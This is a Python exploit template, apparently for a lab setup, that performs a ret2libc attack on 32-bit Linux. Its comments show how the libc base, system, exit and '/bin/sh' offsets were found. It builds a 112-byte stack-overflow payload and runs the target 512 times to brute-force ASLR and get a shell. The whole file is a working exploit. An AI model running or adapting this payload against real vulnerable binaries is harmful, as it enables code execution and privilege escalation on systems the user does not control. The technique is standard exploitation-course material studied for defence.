#!/usr/bin/env python
#===========================================================
# Template script to for ret2glibc for dep bypass
# ASLR bruteforce on 32bit Linux system
#===========================================================
from subprocess import call
import struct

# ldd ./overflw |grep libc
#        libc.so.6 => /usr/lib32/libc.so.6 (0xb752c000)
libc_base_addr = 0xb752c000

# readelf -s /lib/i386-linux-gnu/libc.so.6 |grep system
#   1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
system_off = 0x00040310

# readelf -s /lib/i386-linux-gnu/libc.so.6 |grep exit
#   139: 00033260    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
exit_off = 0x00033260

# strings -a -t x /lib/i386-linux-gnu/libc.so.6  |grep "/bin/sh"
# 162d4c /bin/sh
arg_off = 0x00162d4c

# peda> p system
#	$1 = {<text variable, no debug info>} 0xb7e62310 <__libc_system>
system_addr = struct.pack("<I",libc_base_addr+system_off)

# peda> disass main
# Dump of assembler code for function main:
#   0x080484a8 <+43>:    call   0x8048360 <exit@plt>

exit_addr = struct.pack("<I",libc_base_addr+exit_off)

# peda> searchmem /bin/sh
#       Searching for '/bin/sh' in: None ranges
#       Found 1 results, display max 1 items:
#       libc : 0xb7f84d4c ("/bin/sh")
arg_addr = struct.pack("<I",libc_base_addr+arg_off)

# Create payload
buf = 'A' * 112
buf += system_addr
buf += exit_addr
buf += arg_addr

# Run 512 times to defeat ASLR
i=0
while (i < 512):
    print "Try: %d" % int(i)
    i = i + 1
    ret = call(["/vagrant/overflow", buf])
